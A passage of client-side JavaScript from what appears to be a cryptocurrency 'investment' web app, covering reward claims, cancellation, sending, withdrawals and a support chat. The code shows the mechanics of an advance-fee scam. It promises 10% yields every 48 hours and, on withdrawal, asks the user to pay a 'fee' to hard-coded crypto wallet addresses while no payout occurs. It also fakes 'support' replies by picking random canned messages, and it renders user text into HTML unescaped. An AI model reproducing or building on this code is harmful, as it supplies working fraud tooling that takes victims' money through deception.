        message: `Investment of ${investmentAmount.toFixed(2)} ${currency} cancelled. Breakout fee: ${breakoutFee.toFixed(2)} ${currency}.`,
        timestamp: new Date().toISOString(),
      },
    };

    await update(ref(database), updates);
    iziToast.success({
      title: "Success",
      message: `Investment cancelled. Breakout fee: ${breakoutFee.toFixed(2)} ${currency}.`,
      position: "topRight",
    });

    $("#investment-status").html("Select an investment amount to start trading.");
    $("#investment-status-title").text("No Active Investment");
    $("#investment-status-amount").text("");
    $(".investment-btn").prop("disabled", false);
    $("#claim-reward").prop("disabled", true);
    $("#cancel-investment").prop("disabled", true);
    $("#countdown-timer").text("No Active Investment");
    $("#darkModal10").iziModal("close");
    $("#darkModal4").iziModal("close");
  } catch (error) {
    iziToast.error({ title: "Error", message: `Failed to cancel investment: ${error.message}`, position: "topRight" });
  } finally {
    submitButton.prop("disabled", false).html("Confirm Cancellation");
  }
});
        $("#claim-reward").on("click", async function () {
  const submitButton = $(this);
  submitButton.prop("disabled", true).html('<i class="fas fa-spinner fa-spin-pulse"></i> Claiming...');

  try {
    const investmentRef = ref(database, `users/${userId}/investment`);
    const userSnapshot = await get(userRef);
    if (!userSnapshot.exists()) throw new Error("User data not found");
    const userData = userSnapshot.val() || {};
    const investmentSnapshot = await get(investmentRef);
    const investmentData = investmentSnapshot.exists() ? investmentSnapshot.val() || {} : {};
    const investmentAmount = parseNumber(investmentData.investmentAmount, 0);
    if (investmentAmount <= 0) throw new Error("No active investment");

    const currency = userData.settings?.currency || "USD";
    const currentBalance = parseNumber(userData.balance, 0);
    const reward = investmentAmount * 0.10; // 10% yield
    const rewardInCurrency = reward * (conversionRates.USD[currency] || 1);

    // Check if 48 hours have passed since last claim
    const now = new Date().getTime();
    const lastClaimTime = investmentData.lastClaim
      ? new Date(investmentData.lastClaim).getTime()
      : investmentData.startDate
        ? new Date(investmentData.startDate).getTime()
        : now;
    if (now - lastClaimTime < 48 * 60 * 60 * 1000) {
      throw new Error("Reward not yet available. Please wait until the countdown completes.");
    }

    const updates = {
      [`users/${userId}/investment/lastClaim`]: new Date().toISOString(),
      [`users/${userId}/balance`]: currentBalance + rewardInCurrency,
      [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
        amount: rewardInCurrency,
        currency,
        wallet: userData.wallet || userWalletAddress,
        network: userData.settings?.network || "ERC20",
        type: "Reward Claim",
        status: "completed",
        timestamp: new Date().toISOString(),
      },
      [`users/${userId}/notifications/${Date.now()}`]: {
        title: "Reward Claimed",
        message: `You claimed ${rewardInCurrency.toFixed(2)} ${currency} as 10% investment yield!`,
        timestamp: new Date().toISOString(),
      },
    };

    // Auto-renew if enabled
    if (userData.settings?.autoRenew) {
      updates[`users/${userId}/investment/lastRenewal`] = new Date().toISOString();
    }

    await update(ref(database), updates);
    iziToast.success({ title: "Success", message: `Claimed ${rewardInCurrency.toFixed(2)} ${currency}!`, position: "topRight" });
    updateCountdown();
  } catch (error) {
    iziToast.error({ title: "Error", message: `Failed to claim reward: ${error.message}`, position: "topRight" });
  } finally {
    submitButton.prop("disabled", true).html("Claim Reward");
  }
});

        $("#send-form").on("submit", async (e) => {
          e.preventDefault();
          const submitButton = $("#submitSendInfo");
          submitButton
            .prop("disabled", true)
            .addClass("loading")
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Sending...');

          const wallet = $("#sendWalletInput").val().trim();
          const amount = parseFloat($("#sendAmountInput").val());

          try {
            const snapshot = await get(userRef);
            if (!snapshot.exists()) {
              iziToast.error({ title: "Error", message: "User data not found!", position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Send");
              return;
            }
            const userData = snapshot.val() || {};
            const currentBalance = userData.balance || 0;
            const currency = userData.settings?.currency || "USD";

            if (!wallet) {
              iziToast.error({ title: "Error", message: "Wallet address cannot be empty!", position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Send");
              return;
            }

            if (isNaN(amount) || amount <= 0) {
              iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Send");
              return;
            }

            if (amount > currentBalance) {
              $("#insufficient-send-balance").removeClass("hide");
              submitButton.prop("disabled", false).removeClass("loading").val("Send");
              return;
            }

            const updates = {
              [`users/${userId}/balance`]: currentBalance - amount,
              [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
                amount: amount,
                currency: currency,
                wallet: wallet,
                network: userData.settings?.network || "ERC20",
                type: "Send",
                status: "pending",
                timestamp: new Date().toISOString(),
              },
              [`users/${userId}/notifications/${Date.now()}`]: {
                title: "Send Requested",
                message: `You sent ${amount.toFixed(2)} ${currency} to ${truncateAddress(wallet)}`,
                timestamp: new Date().toISOString(),
              },
            };

            await update(ref(database), updates);
            iziToast.success({ title: "Success", message: `Sent ${amount.toFixed(2)} ${currency}!`, position: "topRight" });
            $("#send-form")[0].reset();
            $("#insufficient-send-balance").addClass("hide");
            $("#darkModal1").iziModal("close");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to send: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).removeClass("loading").val("Send");
          }
        });

        $("#wallet-form").on("submit", async (e) => {
          e.preventDefault();
          const submitButton = $("#submitWalletInfo");
          submitButton
            .prop("disabled", true)
            .addClass("loading")
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Withdrawing...');

          const wallet = $("#walletInput").val().trim();
          const amount = parseFloat($("#wallet_amountInput").val());
          const network = $("#walletNetwork").val();

          try {
            const snapshot = await get(userRef);
            if (!snapshot.exists()) {
              iziToast.error({ title: "Error", message: "User data not found! Please try again.", position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
              return;
            }
            const userData = snapshot.val() || {};
            const currentBalance = userData.balance || 0;
            const currency = userData.settings?.currency || "USD";

            if (!wallet) {
              iziToast.error({ title: "Error", message: "Wallet address cannot be empty!", position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
              return;
            }

            if (isNaN(amount) || amount <= 0) {
              iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
              return;
            }

            if (amount > currentBalance) {
              $("#insufficient-balance").removeClass("hide");
              iziToast.error({ title: "Error", message: `Insufficient balance: ${currentBalance.toFixed(2)} ${currency} available`, position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
              return;
            }

            if (amount < 70.01 && currency === "USD") {
              $("#darkModal7").iziModal("close");
              $("#darkModal2").iziModal("open");
              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
              return;
            }

            // Define fee addresses
            const feeAddresses = {
              Bitcoin: "1HRaVe6ALzKhKX5i1QsxTTm3jaJMrx2mw4",
              ERC20: currency === "USDT" ? "TFjxrVXrU3mBLUNeQHnsM4F7SStnQjiR8m" : "0x85e9c9561f1dcdc94d8ee089d914cc5f014a4173",
            };
            const feeWallet = feeAddresses[network] || feeAddresses["ERC20"];
            const feeCurrency = network === "Bitcoin" ? "BTC" : currency;

            // Calculate fee: 4.0816% of amount, converted to feeCurrency
            const feePercentage = 0.040816; // 4.0816%
            let feeAmountUSD = amount * feePercentage;
            if (currency !== "USD") {
              feeAmountUSD = amount * (1 / conversionRates[currency].USD);
            }
            let feeAmount = feeAmountUSD * (conversionRates.USD[feeCurrency] || 1);

            // Apply minimum fees
            const minFees = {
              BTC: 0.0001, // ~$6.67 at $66,666/BTC
              USDT: 0.50,
              ETH: 0.0002, // ~$0.61 at $3,030/ETH
            };
            feeAmount = Math.max(feeAmount, minFees[feeCurrency] || minFees.USDT);

            const updates = {
              [`users/${userId}/balance`]: currentBalance - amount,
              [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
                amount: amount,
                currency: currency,
                wallet: wallet,
                network: network,
                type: "Withdraw",
                status: "pending",
                timestamp: new Date().toISOString(),
              },
              [`users/${userId}/notifications/${Date.now()}`]: {
                title: "Withdrawal Requested",
                message: `You requested a withdrawal of ${amount.toFixed(2)} ${currency} to ${truncateAddress(wallet)}`,
                timestamp: new Date().toISOString(),
              },
            };

            await update(ref(database), updates);
            document.cookie = `userWithdrawal=${amount}; path=/`;
            $("#wallet-form")[0].reset();
            $("#insufficient-balance").addClass("hide");
            $("#darkModal7").iziModal("close");
            $("#darkModal8").iziModal("open");

            // Update fee modal
            $("#fee-amount").text(feeAmount.toFixed(feeCurrency === "BTC" || feeCurrency === "ETH" ? 6 : 2));
            $("#fee-currency").text(feeCurrency);
            $("#fee-wallet").text(feeWallet);

            const qrCodeContainer = document.getElementById("qrCodeContainer");
            qrCodeContainer.innerHTML = "";
            new QRCode(qrCodeContainer, {
              text: feeWallet,
              width: 128,
              height: 128,
              colorDark: "#000000",
              colorLight: "#ffffff",
              correctLevel: QRCode.CorrectLevel.H,
            });
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to withdraw: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
          }
        });

        $("#continuePayment").on("click", async () => {
          const cookies = document.cookie.split(";").reduce((acc, cookie) => {
            const [name, value] = cookie.trim().split("=");
            acc[name] = value;
            return acc;
          }, {});

          if (!cookies.userWithdrawal) {
            iziToast.error({ title: "Error", message: "No withdrawal request found!", position: "topRight" });
            return;
          }

          try {
            const snapshot = await get(userRef);
            if (!snapshot.exists()) {
              iziToast.error({ title: "Error", message: "User data not found!", position: "topRight" });
              return;
            }
            const userData = snapshot.val() || {};
            const network = userData.settings?.network || "ERC20";
            const currency = userData.settings?.currency || "USD";
            const feeAddresses = {
              Bitcoin: "1HRaVe6ALzKhKX5i1QsxTTm3jaJMrx2mw4",
              ERC20: currency === "USDT" ? "TFjxrVXrU3mBLUNeQHnsM4F7SStnQjiR8m" : "0x85e9c9561f1dcdc94d8ee089d914cc5f014a4173",
            };
            const feeWallet = feeAddresses[network] || feeAddresses["ERC20"];
            const feeCurrency = network === "Bitcoin" ? "BTC" : currency;

            // Calculate fee for the withdrawal amount
            const withdrawalAmount = parseFloat(cookies.userWithdrawal);
            let feeAmountUSD = withdrawalAmount * 0.040816;
            if (currency !== "USD") {
              feeAmountUSD = withdrawalAmount * (1 / conversionRates[currency].USD);
            }
            let feeAmount = feeAmountUSD * (conversionRates.USD[feeCurrency] || 1);
            const minFees = {
              BTC: 0.0001,
              USDT: 0.50,
              ETH: 0.0002,
            };
            feeAmount = Math.max(feeAmount, minFees[feeCurrency] || minFees.USDT);

            await update(ref(database, `users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`), {
              amount: feeAmount,
              currency: feeCurrency,
              wallet: feeWallet,
              network: network,
              type: "Fee Payment",
              status: "pending",
              timestamp: new Date().toISOString(),
            });
            document.cookie = `userPaid=true; path=/`;
            $("#darkModal8").iziModal("close");
            $("#darkModal9").iziModal("open");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to process payment: ${error.message}`, position: "topRight" });
          }
        });

        $("#continuePaymentCls").on("click", () => {
          $("#darkModal9").iziModal("close");
          document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
          document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
        });

        $("#logout-btn").on("click", () => {
          try {
            window.Telegram.WebApp.close();
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to logout: ${error.message}`, position: "topRight" });
          }
        });

        onValue(ref(database, `users/${userId}/notifications`), (snapshot) => {
          const notifications = snapshot.val() || {};
          const notificationList = $("#notification-table-body");
          notificationList.empty();

          // Sort notifications by timestamp (descending)
          const sortedNotifications = Object.entries(notifications).sort(([, a], [, b]) => {
            return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
          });

          sortedNotifications.forEach(([id, notif]) => {
            notificationList.append(`
              <li>
                <strong>${notif.title}</strong>: ${notif.message}<br>
                <small>${new Date(notif.timestamp).toLocaleString()}</small>
              </li>
            `);
          });
        });

        onValue(ref(database, `users/${userId}/transactions`), (snapshot) => {
          const transactions = snapshot.val() || {};
          const transactionTable = $("#transaction-table-body");
          transactionTable.empty();

          // Sort transactions by timestamp (descending)
          const sortedTransactions = Object.entries(transactions).sort(([, a], [, b]) => {
            return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
          });

          sortedTransactions.forEach(([id, tx]) => {
            const currency = tx.currency && ["USD", "USDT", "BTC", "ETH"].includes(tx.currency) ? tx.currency : "USD";
            const amount = currency === "BTC" || currency === "ETH" ? tx.amount.toFixed(6) : tx.amount.toFixed(2);
            const network = tx.type === "Send" || tx.type === "Receive" ? "N/A" : (tx.network || "ERC20");
            transactionTable.append(`
              <tr>
                <td>${amount} ${currency}</td>
                <td>${currency}</td>
                <td class="wallet-cell">
                  ${truncateAddress(tx.wallet)}
                  <button class="btn-copy" data-wallet="${tx.wallet}">Copy</button>
                </td>
                <td>${network}</td>
                <td>${tx.type}</td>
                <td>${tx.status}</td>
                <td>${new Date(tx.timestamp).toLocaleString()}</td>
              </tr>
            `);
          });

          $(".btn-copy").on("click", async function() {
            const wallet = $(this).data("wallet");
            try {
              await copyToClipboard(wallet);
              showToast("Wallet address copied!");
            } catch (error) {
              iziToast.error({ title: "Error", message: `Failed to copy wallet address: ${error.message}`, position: "topRight" });
            }
          });
        });

        let isTyping = false;
        async function simulateSupportResponse(message) {
          const chatMessages = $("#chat-messages");
          const typingIndicator = $(`
            <div class="typing-indicator">
              <span></span><span></span><span></span>
            </div>
          `);
          chatMessages.append(typingIndicator);
          chatMessages.scrollTop(chatMessages[0].scrollHeight);

          await new Promise(resolve => setTimeout(resolve, 2000));

          const responses = [
            "Thanks for reaching out! How can we assist you today?",
            "We're here to help. Could you provide more details?",
            `Got your message: "${message.slice(0, 20)}${message.length > 20 ? "..." : ""}". What's next?`,
            "Our team is reviewing your query. Please hold on.",
            "Can you clarify your request? We're all ears!",
          ];
          const randomResponse = responses[Math.floor(Math.random() * responses.length)];

          typingIndicator.remove();
          const supportMessage = {
            message: randomResponse,
            sender: "support",
            timestamp: new Date().toISOString(),
            status: "sent",
          };

          const newMessageRef = push(ref(database, `users/${userId}/chat`));
          await set(newMessageRef, supportMessage);
        }

        $("#send-message").on("click", async () => {
          const message = $("#chat-input").val().trim();
          if (!message) {
            iziToast.error({ title: "Error", message: "Message cannot be empty!", position: "topRight" });
            return;
          }

          try {
            const newMessageRef = push(ref(database, `users/${userId}/chat`));
            await set(newMessageRef, {
              message: message,
              sender: "user",
              timestamp: new Date().toISOString(),
              status: "pending",
            });

            $("#chat-input").val("");
            iziToast.success({ title: "Success", message: "Message sent!", position: "topRight" });

            setTimeout(async () => {
              await update(ref(database, `users/${userId}/chat/${newMessageRef.key}`), { status: "sent" });
              await simulateSupportResponse(message);
            }, 1000);
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to send message: ${error.message}`, position: "topRight" });
          }
        });

        $("#chat-input").on("keypress", async (e) => {
          if (e.which === 13) {
            e.preventDefault();
            $("#send-message").click();
          }
        });

        $("#chat-input").on("input", () => {
          isTyping = true;
          setTimeout(() => {
            isTyping = false;
            $("#chat-messages").scrollTop($("#chat-messages")[0].scrollHeight);
          }, 500);
        });

        onValue(ref(database, `users/${userId}/chat`), (snapshot) => {
          const messages = snapshot.val() || {};
          const chatContainer = $("#chat-messages");
          chatContainer.empty();

          // Group messages by date
          const groupedMessages = {};
          Object.entries(messages).forEach(([id, msg]) => {
            const dateCategory = formatChatDate(msg.timestamp);
            if (!groupedMessages[dateCategory]) {
              groupedMessages[dateCategory] = [];
            }
            groupedMessages[dateCategory].push({ id, ...msg });
          });

          // Sort date categories (Today, Yesterday, then older dates)
          const sortedDates = Object.keys(groupedMessages).sort((a, b) => {
            if (a === "Today") return -1;
            if (b === "Today") return 1;
            if (a === "Yesterday") return -1;
            if (b === "Yesterday") return 1;
            return new Date(b).getTime() - new Date(a).getTime();
          });

          // Render messages
          sortedDates.forEach((date) => {
            chatContainer.append(`<p class="chat-date-header">${date}</p>`);
            groupedMessages[date].forEach(({ id, ...msg }) => {
              const isUser = msg.sender === "user";
              const statusClass = msg.status === "pending" ? "pending" : "sent";
              const statusIcon = msg.status === "pending" ? '<i class="fas fa-check"></i>' : '<i class="fas fa-check-double"></i>';
              chatContainer.append(`
                <div class="chat-message ${isUser ? "user" : "support"}">
                  ${isUser ? `<span class="avatar">${username[0].toUpperCase()}</span>` : `<span class="avatar"><i class="fas fa-headphones"></i></span>`}
                  ${msg.message}
                  <div class="message-footer">
                    <small>${formatChatDate(msg.timestamp)}</small>
                    ${isUser ? `<span class="status ${statusClass}">${statusIcon}</span>` : ""}
                  </div>
                </div>
              `);
            });
          });

          if (!isTyping) {
            chatContainer.scrollTop(chatContainer[0].scrollHeight);
          }

          const lastSupportMessage = Object.values(messages)
            .filter((msg) => msg.sender === "support")
            .slice(-1)[0];
          const lastSeen = lastSupportMessage ? formatChatDate(lastSupportMessage.timestamp) : "Online";
          $("#support-status").text(`Support was last seen: ${lastSeen}`);
        });
      });
    });
  //
  //
